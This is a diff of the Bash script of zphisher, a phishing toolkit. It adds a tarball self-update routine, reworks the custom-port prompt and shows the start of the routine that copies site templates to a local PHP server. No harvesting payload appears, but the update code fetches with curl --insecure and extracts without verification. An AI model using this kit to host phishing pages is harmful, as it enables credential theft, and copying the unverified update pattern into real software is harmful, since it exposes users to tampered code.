@@ -92,6 +92,10 @@
 
 __version__="2.3.2"
 
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
+
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
@@ -100,6 +104,8 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -159,15 +165,22 @@ kill_pid() {
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
 	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url=https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz
 
-	if [[ $(curl -s $relase_url | grep '"tag_name":' | awk -F\" '{print $4}') != $__version__ ]]; then
+	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE} update found\n"${WHITE}
-		sleep 1
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Updating..."
-		git pull origin master
-		{ clear; banner_small; }
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again"${WHITE}
-		exit
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$BASE_DIR/.." > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		[[ -e ".zphisher.tar.gz" ]] && tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		rm -f .zphisher.tar.gz
+		popd > /dev/null 2>&1
+		{ sleep 3; clear; banner_small; }
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+		{ reset_color ; exit 1; }
 	else
 		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
 	fi
@@ -380,34 +393,26 @@ about() {
 	esac
 }
 
-## Setup website and start php server
-HOST='127.0.0.1'
-#DEFAULT PORT
-PORT='8080' 
-
-#CUSTOM PORT
+## Choose custom port
 cusport() {
-	echo ""
+	echo
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
-		printf "\n\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port 1024-9999 : ${WHITE}" CU_P
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
-			echo ""
+			echo
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
 			{ sleep 2; clear; banner; cusport; }
-		fi
-	elif [[ ${P_ANS} =~ ^([Nn])$ ]];then
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
-		echo ""
+		fi		
 	else 
-		echo ""
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
-		cusport
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
+
+## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
